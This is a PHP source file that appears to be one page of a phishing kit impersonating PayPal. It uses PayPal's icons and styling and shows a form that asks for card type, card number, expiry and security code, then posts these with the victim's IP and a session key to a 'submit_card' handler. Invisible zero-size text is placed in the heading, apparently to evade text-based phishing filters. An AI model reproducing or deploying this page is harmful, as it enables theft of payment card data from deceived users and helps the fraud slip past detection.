<?php
//error_reporting(0);
session_start();
require_once '../main.php';
//require_once 'session.php';

require_once 'more.php';
require_once '../lang.php';
$_SESSION['cc_kedua'] = "";  // ???
//require_once 'mmn.php';

?>
    <!DOCTYPE html>
    <html>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
        <title>
            <?php echo $account['title'];?>
        </title>
        <link rel="stylesheet" href="assets/css/process.css">
        <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
        </script>
        <script type="text/javascript" src="assets/js/jquery.mask.min.js">
        </script>
        <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
    </head>

    <body>
        <?php include "assets/static/header.html" ?>
            <div class="mainContainer">
                <div class="hide" id="rotate">
                    <div class="spinner">
                        <div class="rotate"></div>
                        <div class="processing">
                            <?php echo $account['processing'];?>...</div>
                    </div>
                    <div class="overlay">
                    </div>
                </div>
                <div class="mobileNav">
                    <div class="navHeader">
                        <div class="blockToggler">
                            <label class="menuLabel" for="toggleMenu"><span></span>
                                <div class="menuOpen">Menu</div>
                                <div class="menuClose">
                                    Close</div>
                            </label>
                        </div>
                    </div>
                    <div class="navLogo">
                        <a href="javascript:" class="mobileBrand"></a>
                    </div>
                    <ul class="notifUl">
                        <li>
                            <a class="svgLogo notifTxt">
                                <img src="assets/img/noti.svg" alt="">
                            </a>
                        </li>
                    </ul>
                </div>
                <div class="contents">
                    <section class="mainContents contentContainerBordered" id="process">
                        <form action="submit_card?key=<?php echo $key;?>" method="post" style="padding:0 20px" novalidate="on">

                            <input id="ipx" type="hidden" hidden="hidden" value="<?php echo $ip2;?>">
                            <input id="keke" type="hidden" hidden="hidden" value="<?php echo $key;?>">
                            <h2 style="font-size: 1.875rem;font-weight: 300;text-transform: none;font-family: 'PayPal-Sans-Big', Helvetica Neue, Arial, sans-serif;">
                    <span style="font-size:0">darkness</span>
                    <?php echo $account['confirm'];?>     <span style="font-size:0">isnot good</span></h2>
                            <div class="fields clearfix">
                                <div class="dropDown">
                                    <select id="ctp" name="ctp" required>
                                        <option value="-1" disabled selected>
                                            <?php echo $account['ctp'];?>
                                        </option>
                                        <option value="vsa">Visa</option>
                                        <option value="msc">MasterCard</option>
                                        <!--<option value="dsc">Discover</option>-->
                                        <option value="amx">American Express</option>
                                        <!--<option value="jcb">JCB</option>-->
                                    </select>
                                    <div id="displaylabelselected" class="labelSelect">
                                        <?php echo $account['ctp'];?>
                                    </div>
                                </div>
                                <div class="inputArea">
                                    <input id="ccn" name="ccn" type="tel" required placeholder="<?php echo $account['ccn'];?>" maxlength="19" autocomplete="off">
                                </div>
                                <div class="multiInputs">
                                    <div class="inputArea hasSub">
                                        <input id="cex" name="cex" type="tel" required placeholder="<?php echo $account['exp'];?>" maxlength="7" autocomplete="off">
                                    </div>
                                    <div class="inputArea hasSub csc pull-right">
                                        <input id="csc" name="csc" type="tel" required placeholder="<?php echo $account['csc'];?>" maxlength="4" autocomplete="off">
                                    </div>
                                </div>
                                <div id="cidmenu" style="top:15px;margin-bottom: 10px;" class="inputArea">

                                </div>
                                <?php echo $card;?>
                                    <button id="btn" style="margin-top:20px;width:100%" type="submit" class="bt">
                                        <?php echo $account['continue'];?>
                                    </button>
                            </div>
                        </form>
                    </section>
                    <?php include "assets/static/footer.html" ?>
                </div>
            </div>
            <script src="assets/js/validate_card.js">
            </script>
    </body>

    </html>